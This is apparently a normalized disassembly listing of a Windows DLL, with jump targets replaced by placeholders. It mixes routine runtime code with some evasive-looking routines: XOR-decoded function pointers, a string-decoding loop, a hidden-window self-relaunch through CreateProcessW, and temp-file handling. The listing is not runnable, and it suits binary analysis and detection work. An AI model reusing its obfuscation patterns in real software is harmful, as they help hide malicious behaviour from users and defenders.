cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10063d70
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov esi [ esi ]
test esi esi
je r-xdata
mov [ esi + 0x20 ] 0x0
pop edi
pop esi
retn
push esi
call edi
sub_10063dc0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10063e20
push ebp
mov ebp esp
push 0xffffffff
push sub_100867e8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_100399e0
mov eax [ edi + 0x4 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10063e80
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_100651be
sub eax ecx
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
mov [ ebp - 0x4 ] edi
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10071bf0
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov edx 0x8
cmp [ eax + 0x14 ] edx
jb r-xdata
mov eax [ ebp + 0xc ]
lea edx [ eax + ebx ]
test eax eax
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
lea edi [ ebx + ebx ]
push ecx
add eax edi
push eax
call sub_10021370
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp esi eax
jne r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edx
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push edi
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1007f580
push ebx
lea ecx [ ecx + edx * 2 ]
mov eax esi
push ecx
push eax
call sub_10021370
jmp r-xdata
mov eax [ esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_10021370
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_10064000
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10064050
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
nop
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1006406d
push 0x64
mov eax sub_10085623
call sub_10047689
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_1004aa10
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10026407
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_10032181
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1002839c
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1000eff4
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_100255aa
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_1005f933
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_1007f310
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_100255aa
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_10021130
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_1002839c
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_10032181
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10005b50
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov eax [ ebp - 0x50 ]
call sub_100262c3
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1000eff4
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_10032181
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_10064410
push ebp
mov ebp esp
sub esp 0xa8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ GetModuleFileNameW@IAT ]
push 0x104
lea eax [ ebp - 0x828 ]
push eax
push 0x0
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
push 0x104
lea ecx [ ebp - 0xa30 ]
push ecx
push edx
call esi
test eax eax
je r-xdata
push r--data
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x620 ]
call sub_10072780
test eax eax
js r-xdata
lea eax [ ebp - 0x828 ]
push eax
lea esi [ ebp - 0x620 ]
call sub_1005dbf0
test eax eax
js r-xdata
push r--data
call sub_1005dbf0
test eax eax
js r-xdata
lea ecx [ ebp - 0xa30 ]
push ecx
call sub_1005dbf0
test eax eax
js r-xdata
push r--data
call sub_1005dbf0
test eax eax
js r-xdata
push rw-data
call sub_1005dbf0
test eax eax
js r-xdata
xor eax eax
push 0x44
push eax
lea edx [ ebp - 0xa88 ]
push edx
mov [ ebp - 0xa40 ] eax
mov [ ebp - 0xa3c ] eax
mov [ ebp - 0xa38 ] eax
mov [ ebp - 0xa34 ] eax
call sub_1007f8f0
add esp 0xc
lea eax [ ebp - 0xa40 ]
push eax
lea ecx [ ebp - 0xa88 ]
push ecx
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
mov edx esi
push edx
push 0x0
mov [ ebp - 0xa88 ] 0x44
call [ CreateProcessW@IAT ]
sub_10064560
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10031fc0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10064581
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_1005f1fb
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_100579de
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_100579de
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_100579de
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_100579de
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1001cffa
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_1001b2d2
push [ ebp - 0x1c ]
call sub_1001b2d2
push [ ebp - 0x20 ]
call sub_1001b2d2
push [ ebp - 0x28 ]
call sub_1001b2d2
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_1001b2d2
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10058423
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_10030370
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_10030370
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_1007f580
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_1007f580
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_1007f580
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1001b2d2
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1001b2d2
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1001b2d2
push [ esi + 0xc0 ]
call sub_1001b2d2
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10064930
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
mov edi edx
mov esi ecx
mov ecx [ r--data ]
mov [ ebp - 0xc0 ] edi
mov [ ebp - 0xb8 ] ebx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffc
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ ebp - 0x24 ]
xor eax eax
push edx
mov [ ebp - 0x12 ] ax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0xf6
mov [ ebp - 0xbc ] ebx
call sub_1002f620
lea eax [ ebp - 0xbc ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x6a
call sub_1002f620
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x114
call sub_1002f620
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xed
call sub_1002f620
mov edi eax
call sub_1004cc80
mov edi [ ebp - 0xc0 ]
jmp r-xdata
mov ebx [ ebp - 0xb8 ]
mov [ edi ] eax
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x10d
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov edi [ edi ]
call sub_10023100
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0xbc ]
test ebx ebx
je r-xdata
sub_10064aa0
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xa
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10064b66
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003e971
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10064c10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100880e6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x268
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x278 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
push 0x208
mov [ esp + 0x1c ] eax
mov ebx ecx
mov ecx [ ebp + 0x18 ]
lea eax [ esp + 0x68 ]
push 0x0
push eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x34 ] edx
call sub_1007f8f0
add esp 0xc
cmp [ ebx + 0x2e4 ] 0x0
mov [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax 0x64
jmp r-xdata
push esi
mov ecx edi
lea esi [ esp + 0x4c ]
call sub_10068a40
add esp 0x4
mov esi eax
lea eax [ ebx + 0x2c4 ]
lea edi [ esp + 0x2c ]
mov [ esp + 0x280 ] 0x0
call sub_100519b0
mov esi 0x8
mov [ esp + 0x280 ] 0x2
cmp [ esp + 0x5c ] esi
jb r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx ] 0xc8
mov eax 0x6
jmp r-xdata
mov ecx [ esp + 0x278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x260 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x28 ]
xor eax eax
mov [ ecx ] eax
mov [ edx ] eax
mov [ esp + 0x48 ] ax
mov [ edi ] eax
lea eax [ esp + 0x64 ]
push eax
push 0x0
push r--data
lea ecx [ ebx + 0xb8 ]
push ecx
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x68 ] 0x0
call [ GetTempFileNameW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x2c ]
mov [ esp + 0x20 ] r--data
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x40 ] esi
jae r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
mov edx [ ebx + 0x2e0 ]
push 0x0
lea ecx [ esp + 0x6c ]
push ecx
push eax
push 0x0
call edx
test eax eax
jns r-xdata
lea eax [ esp + 0x2c ]
cmp [ esp + 0x64 ] 0x0
je r-xdata
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ esp + 0x64 ]
push ecx
call [ DeleteFileW@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
lea eax [ esp + 0x7c ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov esi [ Sleep@IAT ]
